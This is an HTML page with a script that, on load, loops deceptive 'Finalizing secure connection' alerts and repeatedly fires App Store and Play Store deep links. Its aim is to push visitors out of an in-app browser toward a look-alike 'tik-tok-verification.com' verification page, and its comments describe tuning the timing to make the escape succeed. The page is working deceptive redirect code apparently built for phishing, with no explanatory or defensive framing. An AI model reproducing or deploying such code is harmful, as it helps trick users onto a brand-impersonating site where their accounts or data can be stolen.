<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 6000; // Increased to 6s to allow the "staircase" to work
    let gap = 400; // Starting with a slightly larger base gap

    function triggerStoreJump() {
        const urlEnc = encodeURIComponent(target);
        // Using the App Store search that confirmed success
        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        const androidTrigger = "market://search?q=" + urlEnc;
        
        const isAndroid = /Android/i.test(navigator.userAgent);
        window.location.href = isAndroid ? androidTrigger : iosTrigger;
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Priming jump
        triggerStoreJump();

        // 2. THE LOCK
        alert("ATTEMPT #27\n\nFinalizing secure connection...\n\nTap OK to open in your browser.");

        // 3. THE PULSE: Fire immediately after tap
        triggerStoreJump();

        // 4. THE STAIRCASE: Increase the gap by 50ms each time to find the "Sweet Spot"
        setTimeout(() => {
            if (Date.now() < killTime) {
                // Secondary pulse halfway through the gap
                triggerStoreJump();
                
                setTimeout(() => {
                    gap += 50; 
                    rampage();
                }, gap / 2);
            }
        }, 150); 
    }

    window.onload = () => {
        rampage();
    };

    window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
</script>
</body>
</html>
